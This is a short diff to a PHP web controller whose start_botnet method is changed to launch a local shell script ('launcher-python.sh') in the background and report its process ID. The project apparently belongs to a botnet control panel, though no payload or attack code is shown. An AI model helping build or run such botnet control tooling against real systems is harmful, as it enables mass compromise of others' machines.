@@ -60,17 +60,13 @@ class HomeController extends Controller
 
     public function start_botnet()
     {
-
+        $command = '/home/debian/PA-BOTNET-WEB/launcher-python.sh > /dev/null 2>&1 & echo $!';
+        exec($command, $output, $return);
+        $pid = $output[0]; // PID du processus lancé
     
-            // Exécute la commande ipconfig et récupère le résultat dans $output
-            exec('/home/debian/PA-BOTNET-WEB/launcher-python.sh', $output, $return);
-            // Convertit le tableau $output en une chaîne de caractères
-            $outputString = implode("\n", $output);
-        
-            
-            return redirect('/home')->with('output', $outputString);
-        
+        return redirect('/home')->with('output', "Processus démarré avec le PID $pid");
     }
+    
 
 
 
